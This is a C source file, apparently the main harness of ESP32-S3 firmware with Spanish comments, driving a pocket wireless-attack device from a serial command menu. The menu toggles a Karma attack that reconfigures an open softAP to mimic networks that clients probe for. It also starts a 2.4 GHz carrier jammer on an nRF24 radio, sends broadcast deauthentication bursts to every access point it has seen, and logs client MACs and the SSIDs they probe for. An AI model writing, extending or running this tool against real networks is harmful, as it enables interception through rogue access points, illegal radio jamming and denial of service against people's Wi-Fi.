/*
 * main.c — arnes de demostracion de esp32s3o-finware
 *
 *   s = estadisticas     k = karma on/off    j = jammer on/off
 *   d = deauth todos     c = limpiar tabla   l = LED on/off   h = ayuda
 */
#include <stdio.h>
#include <string.h>
#include <ctype.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

#include "esp_log.h"
#include "esp_system.h"
#include "esp_heap_caps.h"
#include "esp_psram.h"
#include "esp_timer.h"
#include "nvs_flash.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_wifi_types.h"

#include "rf_core.h"
#include "karma.h"
#include "nrf24.h"
#include "nrf24_dual.h"
#include "ws2812.h"

static const char *TAG = "finware";

/* ------------------------------------------------------------------ */
/* PINES. Evita 26-37 (flash/PSRAM octal), 19/20 (USB), 43/44 (UART0). */
/* ------------------------------------------------------------------ */
#ifndef A_MOSI
#define A_MOSI  11
#define A_MISO  13
#define A_SCLK  12
#define A_CS    10
#define A_CE     9
#endif

#ifndef B_MOSI
#define B_MOSI  17
#define B_MISO  16
#define B_SCLK  15
#define B_CS    14
#define B_CE     8
#endif

/* ------------------------------------------------------------------ */
/* LED de estado                                                      */
/* ------------------------------------------------------------------ */
typedef enum {
    LED_OFF = 0,
    LED_RAINBOW,       /* idle: ciclo lento              */
    LED_KARMA,         /* rojo latiendo: karma activo    */
    LED_JAM,           /* azul fijo: jammer emitiendo    */
    LED_ATTACK,        /* verde latiendo: deauth enviado */
    LED_BOOT,          /* destello blanco al arrancar    */
} led_mode_t;

static volatile int s_led_mode = LED_OFF;
static volatile int s_led_on   = 1;

static const char *mac2str(const uint8_t *m, char *buf)
{
    sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X",
            m[0], m[1], m[2], m[3], m[4], m[5]);
    return buf;
}

/* ------------------------------------------------------------------ */
/* Tarea del LED: solo toca el LED. El estado lo fija la CLI.         */
/* ------------------------------------------------------------------ */
static void led_task(void *arg)
{
    (void)arg;
    uint8_t pos = 0;

    for (;;) {
        int mode = s_led_mode;
        if (!s_led_on || mode == LED_OFF) {
            ws2812_off();
            vTaskDelay(pdMS_TO_TICKS(120));
            continue;
        }

        switch (mode) {
        case LED_RAINBOW:
            /* 1 paso cada 50 ms -> ciclo completo en ~13 s. Lento. */
            ws2812_wheel(pos, (uint8_t[3]){0}, (uint8_t[3]){0}, (uint8_t[3]){0});
            {
                uint8_t r, g, b;
                ws2812_wheel(pos, &r, &g, &b);
                ws2812_set(r, g, b);
            }
            pos = (uint8_t)(pos + 1);
            vTaskDelay(pdMS_TO_TICKS(50));
            break;

        case LED_KARMA: {
            /* latido rojo */
            uint8_t v = (uint8_t)((pos < 128) ? pos : (255 - pos));
            ws2812_set(v, 0, 0);
            pos = (uint8_t)(pos + 4);
            vTaskDelay(pdMS_TO_TICKS(12));
            break;
        }

        case LED_JAM:
            ws2812_set(0, 0, 200);          /* azul fijo */
            vTaskDelay(pdMS_TO_TICKS(150));
            break;

        case LED_ATTACK: {
            /* destello verde, se apaga solo tras 4 ciclos */
            static int n = 0;
            ws2812_set(0, (uint8_t)((pos < 128) ? 255 : 0), 0);
            pos = (uint8_t)(pos + 64);
            if (++n >= 8) { n = 0; s_led_mode = LED_RAINBOW; }
            vTaskDelay(pdMS_TO_TICKS(40));
            break;
        }

        case LED_BOOT:
            ws2812_set(255, 255, 255);
            vTaskDelay(pdMS_TO_TICKS(120));
            ws2812_off();
            vTaskDelay(pdMS_TO_TICKS(120));
            ws2812_set(255, 255, 255);
            vTaskDelay(pdMS_TO_TICKS(120));
            s_led_mode = LED_RAINBOW;
            break;

        default:
            vTaskDelay(pdMS_TO_TICKS(100));
            break;
        }
    }
}

/* ------------------------------------------------------------------ */
/* Karma pide que reconvirtamos el softAP para completar la asociacion  */
/* ------------------------------------------------------------------ */
static void on_karma_auth(const char *ssid, uint8_t chan)
{
    wifi_config_t ap;
    if (esp_wifi_get_config(WIFI_IF_AP, &ap) != ESP_OK) return;

    size_t n = strlen(ssid);
    if (n > 31) n = 31;
    memset(ap.ap.ssid, 0, sizeof(ap.ap.ssid));
    memcpy(ap.ap.ssid, ssid, n);
    ap.ap.ssid_len       = (uint8_t)n;
    ap.ap.channel        = chan;
    ap.ap.max_connection = 4;
    ap.ap.authmode       = WIFI_AUTH_OPEN;

    if (esp_wifi_set_config(WIFI_IF_AP, &ap) == ESP_OK) {
        ESP_LOGW(TAG, "softAP -> '%s' ch%d: el cliente completara la asociacion",
                 ssid, chan);
    }
}

/* ------------------------------------------------------------------ */
/* Consumidor de tramas Wi-Fi: core 1. Alimenta a Karma.               */
/* ------------------------------------------------------------------ */
static void on_frame(const rf_frame_t *f, void *user)
{
    (void)user;
    rf_mgmt_info_t m;

    if (!rf_parse_mgmt(f, &m)) return;
    karma_feed(&m);

    if (m.subtype == RF_SUB_BEACON) {
        rf_ap_entry_t *ap = rf_ap_upsert(&m);
        if (ap != NULL && ap->beacons == 1u) {
            char b[18];
            ESP_LOGI(TAG, "AP   %s  ch%-2d  %4d dBm  %-3s '%s'",
                     mac2str(m.bssid, b), m.chan, m.rssi,
                     ap->wpa2 ? "WPA" : "OPN", ap->ssid);
        }
    } else if (m.subtype == RF_SUB_PROBE_REQ && m.ssid_len > 0) {
        char b[18];
        ESP_LOGI(TAG, "PROBE %s busca '%s'", mac2str(m.transmitter, b), m.ssid);
    }
}

/* ------------------------------------------------------------------ */
static void stats_task(void *arg)
{
    (void)arg;
    for (;;) {
        vTaskDelay(pdMS_TO_TICKS(4000));
        rf_stats_t s = rf_stats();
        ESP_LOGI(TAG, "rx=%u drop=%u parsed=%u ap=%u tx_ok=%u tx_fail=%u hops=%u karma=%u",
                 s.rx_total, s.rx_dropped, s.rx_parsed, rf_ap_count(),
                 s.tx_ok, s.tx_fail, s.hopper_hops, karma_target_count());
    }
}

/* ------------------------------------------------------------------ */
/* Barrido dual de espectro: los dos modulos a la vez, cores distintos */
/* ------------------------------------------------------------------ */
static void spectrum_task(void *arg)
{
    (void)arg;
    nrf_dual_result_t r;

    for (;;) {
        vTaskDelay(pdMS_TO_TICKS(700));

        nrf24_dual_sweep_async();
        while (!nrf24_dual_sweep_done()) {
            vTaskDelay(pdMS_TO_TICKS(1));
        }
        nrf24_dual_result(&r);

        char line[160];
        size_t o = 0;
        o += (size_t)snprintf(line + o, sizeof(line) - o, "2.4G[%uus,%uhit]: ",
                              r.sweep_us, r.hits);
        for (uint32_t ch = 0; ch < NRF_DUAL_CHANNELS; ch += 4) {
            uint32_t hit = r.rpd[ch] | r.rpd[ch + 1] | r.rpd[ch + 2] | r.rpd[ch + 3];
            o += (size_t)snprintf(line + o, sizeof(line) - o, "%s", hit ? "#" : ".");
        }
        ESP_LOGI(TAG, "%s", line);
    }
}

/* ------------------------------------------------------------------ */
static bool deauth_cb(const rf_ap_entry_t *e, void *user)
{
    (void)user;
    char b[18];
    rf_set_channel(e->chan, WIFI_SECOND_CHAN_NONE);
    for (int i = 0; i < 8; i++) {
        rf_deauth_bcast(e->bssid, 7);          /* reason 7: class 3 frame */
        vTaskDelay(pdMS_TO_TICKS(2));
    }
    ESP_LOGW(TAG, "deauth -> %s '%s' (ch%d)", mac2str(e->bssid, b), e->ssid, e->chan);
    return true;
}

/* ------------------------------------------------------------------ */
static int s_karma_on;
static int s_jammer_on;

static void cli_task(void *arg)
{
    (void)arg;
    int c;

    for (;;) {
        c = getchar();
        if (c == EOF) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        switch (tolower(c)) {
        case 's': {
            rf_stats_t s = rf_stats();
            ESP_LOGI(TAG, "rx=%u drop=%u parsed=%u ap=%u tx_ok=%u tx_fail=%u hops=%u karma=%u",
                     s.rx_total, s.rx_dropped, s.rx_parsed, rf_ap_count(),
                     s.tx_ok, s.tx_fail, s.hopper_hops, karma_target_count());
            break;
        }
        case 'k':
            s_karma_on = !s_karma_on;
            if (s_karma_on) {
                karma_start();
                s_led_mode = LED_KARMA;
            } else {
                karma_stop();
                rf_hop_start(120, 1, 14);
                s_led_mode = LED_RAINBOW;
            }
            ESP_LOGW(TAG, "karma %s", s_karma_on ? "ON" : "OFF");
            break;

        case 'j':
            s_jammer_on = !s_jammer_on;
            if (s_jammer_on) {
                nrf24_carrier(nrf24_dual_b(), 40);   /* centro de 2.4 GHz */
                s_led_mode = LED_JAM;
                ESP_LOGW(TAG, "jammer ON (modulo B, ch40)");
            } else {
                nrf24_carrier_stop(nrf24_dual_b());
                s_led_mode = LED_RAINBOW;
                ESP_LOGW(TAG, "jammer OFF");
            }
            break;

        case 'd':
            if (rf_ap_count() == 0) {
                ESP_LOGW(TAG, "tabla vacia");
            } else {
                ESP_LOGW(TAG, "atacando %u AP(s)", rf_ap_count());
                s_led_mode = LED_ATTACK;
                rf_ap_iterate(deauth_cb, NULL);
            }
            break;

        case 'c':
            rf_ap_clear();
            ESP_LOGI(TAG, "tabla limpiada");
            break;

        case 'l':
            s_led_on = !s_led_on;
            ESP_LOGI(TAG, "LED %s", s_led_on ? "ON" : "OFF");
            break;

        case 'h':
            ESP_LOGI(TAG, "s=stats k=karma j=jammer d=deauth c=limpiar l=led h=ayuda");
            break;

        default: break;
        }
    }
}

/* ------------------------------------------------------------------ */
void app_main(void)
{
    esp_err_t e = nvs_flash_init();
    if (e == ESP_ERR_NVS_NO_FREE_PAGES || e == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        e = nvs_flash_init();
    }
    ESP_ERROR_CHECK(e);

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());

    ESP_LOGI(TAG, "esp32s3o-finware | IDF %s", esp_get_idf_version());
    ESP_LOGI(TAG, "PSRAM: %u KB",
             (unsigned)(heap_caps_get_total_size(MALLOC_CAP_SPIRAM) / 1024));

    /* ---- nucleo de radio Wi-Fi ---- */
    ESP_ERROR_CHECK(rf_core_init());
    ESP_ERROR_CHECK(rf_ap_table_init());
    ESP_ERROR_CHECK(rf_core_start());
    rf_sniffer_attach(on_frame, NULL);
    ESP_ERROR_CHECK(rf_hop_start(120, 1, 14));

    /* ---- karma ---- */
    ESP_ERROR_CHECK(karma_init());
    karma_set_auth_cb(on_karma_auth);

    /* ---- doble nRF24 ---- */
    nrf24_cfg_t ca = { .host = SPI2_HOST, .mosi = A_MOSI, .miso = A_MISO,
                       .sclk = A_SCLK, .cs = A_CS, .ce = A_CE };
    nrf24_cfg_t cb = { .host = SPI3_HOST, .mosi = B_MOSI, .miso = B_MISO,
                       .sclk = B_SCLK, .cs = B_CS, .ce = B_CE };
    bool nrf_ok = (nrf24_dual_init(&ca, &cb) == ESP_OK);
    if (nrf_ok) {
        xTaskCreatePinnedToCore(spectrum_task, "spec", 4096, NULL, 3, NULL, 1);
    } else {
        ESP_LOGE(TAG, "doble nRF24 no arranco: revisa pines y alimentacion");
    }

    xTaskCreatePinnedToCore(stats_task, "stats", 4096, NULL, 3, NULL, 1);
    xTaskCreatePinnedToCore(cli_task,   "cli",   4096, NULL, 2, NULL, 1);

    /* ---- LED RGB: lo ultimo, cuando todo ya corre ---- */
    if (ws2812_init(WS2812_GPIO) == ESP_OK) {
        s_led_mode = LED_BOOT;                 /* destello blanco */
        xTaskCreatePinnedToCore(led_task, "led", 4096, NULL, 1, NULL, 1);
    } else {
        ESP_LOGW(TAG, "LED RGB no disponible en GPIO%d", WS2812_GPIO);
    }

    ESP_LOGI(TAG, "listo. 'h' para ayuda.");
}
